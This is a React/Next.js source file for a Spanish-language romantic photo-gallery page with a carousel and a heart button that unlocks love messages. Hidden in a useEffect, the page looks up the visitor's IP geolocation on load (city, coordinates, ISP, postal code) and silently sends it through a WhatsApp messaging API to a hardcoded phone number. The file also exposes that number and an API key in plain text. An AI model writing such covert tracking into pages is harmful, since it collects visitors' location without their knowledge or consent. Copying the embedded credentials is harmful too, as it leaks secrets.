import Image from 'next/image'
import Carousel from 'react-bootstrap/Carousel';
import photo1 from '../../public/img1.jpg'
import photo2 from '../../public/img2.jpg'
import photo3 from '../../public/img3.jpg'
import photo4 from '../../public/img4.jpg'
import { useEffect, useState } from 'react';
import styles from '../../styles/Home.module.css'
import Head from 'next/head'
import Button from 'react-bootstrap/Button';
import Form from 'react-bootstrap/Form';
import axios from 'axios';

const ImagesGalleryX = () => {
  const [index, setIndex] = useState(0);
  const [cora, setCora] = useState(0);
  const [message, setMessage] = useState(false);
  const [ipInfo, setIpInfo] = useState([]);
  const [enviado, setEnviado] = useState(0);


  async function getIpClient() {
    try {
      const response = await axios.get('https://ipinfo.io/json');
      setIpInfo(response);
      console.log(response);
    } catch (error) {
      console.error(error);
    }
  }
  

  useEffect(() => {

    getIpClient();

    if(enviado < 1){
      console.log(ipInfo);
    let rta = ipInfo?.data?.city + " " +ipInfo?.data?.country+ " " +ipInfo?.data?.ip+ " " +ipInfo?.data?.loc+ " " +ipInfo?.data?.org+ " " +ipInfo?.data?.postal+ " " +ipInfo?.data?.region;
    let userInfo = {
      phone: '573102796853',
      text: rta,
      apikey: '7625476'
  }
    axios.get('https://api.callmebot.com/whatsapp.php', {
      params: userInfo
  }).then(response => {
    
}).catch(e => {
    console.log(e);
})
setEnviado(enviado+2);

    }    
    
    //https://api.callmebot.com/whatsapp.php?phone=+34123123123&text=This+is+a+test+from+CallMeBot&apikey=1234567890
    
  }, [ipInfo, enviado]);

  const handleSelect = (selectedIndex, e) => {
    setIndex(selectedIndex);
  };

  function activateCora(){
    console.log('Te amo'+cora);
    setCora(cora + 1);
  }

  //https://api.callmebot.com/whatsapp.php?phone=573102796853&text=This+is+a+test&apikey=7625476

  function SendWhatsapp(text){
    if(message){
      let userInfo = {
        phone: '573102796853',
        text: 'prueba hola ',
        apikey: '7625476'
    }
      //https://api.callmebot.com/whatsapp.php?phone=+34123123123&text=This+is+a+test+from+CallMeBot&apikey=1234567890
      axios.get('https://api.callmebot.com/whatsapp.php', {
        params: userInfo
    });

    }
    
    setMessage(false);
    setCora(cora + 1);
  }



  function SendMessage(){
    return(
      <div>
        <Form.Label htmlFor="inputPassword5">Password</Form.Label>
      <Form.Control
        type="text"
        id="inputPassword5"
        aria-describedby="passwordHelpBlock"
      />
      <Form.Text id="passwordHelpBlock" muted>
        Your password must be 8-20 characters long, contain letters and numbers,
        and must not contain spaces, special characters, or emoji.
      </Form.Text>
      </div>
    );
  }

  return(
  <div className={styles.container}>
     <Head>
        <title>Ale y holk</title>
        <meta name="description" content="Agendas" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className="text-center">
      <h1 className={styles.title}>
          Te amo con todo mi corazón {cora > 2 && <>X {cora}</>}
          {cora > 20 && <><h2>Eres mi chica lista</h2></>}
          {cora > 50 && <><h2>Yo te amo muchísimo mas preciosa</h2></>}          
          {cora > 60 && <><h2>Enserio preciosa Que feliz me siento, te amo</h2></>}
          {cora > 100 && <><h2>Preciosaaa Te amoooooooo</h2></>}
          {cora > 200 && <><h2>Si llegaste hasta aquí es una señal, te amoooo  </h2></>}
          {cora > 1000 && <><h2>OMG de verdad desbloqueaste este nivel? Nivel valido para que escojas el regalo que quieras - Te amo locamente</h2></>}
       </h1>
       <h2>Ale y holk</h2>
       <Button variant="light" onClick={activateCora}>TOCA MI CORAZÓN</Button>
      </main>
      
    <Carousel activeIndex={index} onSelect={handleSelect}>
      <Carousel.Item>
      <Image        
        src={photo1}
        alt="Picture of the author"
        className="d-flex w-100 img-fluid"
        width={800} //automatically provided
        height={600} //automatically provided
        // blurDataURL="data:..." automatically provided
        //placeholder="blur" // Optional blur-up while loading
      />
        <Carousel.Caption>
          <h3>Conocerte</h3>
          <p>Vivir contigo y amanecer a tu lado realmente es lo mas lindo del mundo</p>
        </Carousel.Caption>
      </Carousel.Item>
      <Carousel.Item>
      <Image
        src={photo2}
        className="d-block w-100 img-fluid"
        alt="Picture of the author"
        width={800} //automatically provided
        height={600} //automatically provided
        // blurDataURL="data:..." automatically provided
        //placeholder="blur" // Optional blur-up while loading
      />

        <Carousel.Caption>
          <h3>Aventuras</h3>
          <p>Los mejores momentos de mi vida los he vivido contigo</p>
        </Carousel.Caption>
      </Carousel.Item>
      <Carousel.Item>
      <Image
        src={photo3}
        className="d-block w-100 img-fluid"
        alt="Picture of the author"
        width={800} //automatically provided
        height={600} //automatically provided
        // blurDataURL="data:..." automatically provided
        //placeholder="blur" // Optional blur-up while loading
      />

        <Carousel.Caption>
          <h3>Futuro</h3>
          <p>
            Es realmente mágico cuando pienso en nuestro futuro. vamos a lograrlo todo como equipo
          </p>
        </Carousel.Caption>
      </Carousel.Item>
      <Carousel.Item>
      <Image
        src={photo4}
        className="d-block w-100 img-fluid"
        alt="Picture of the author"
        width={800} //automatically provided
        height={600} //automatically provided
        // blurDataURL="data:..." automatically provided
        //placeholder="blur" // Optional blur-up while loading
      />
        <Carousel.Caption>
          <h3>Tus besos</h3>
          <p>Son de otro mundo, hace vibrar mi corazón</p>
        </Carousel.Caption>
      </Carousel.Item>
    </Carousel>
    

  </div>
  );
}
  

export default ImagesGalleryX;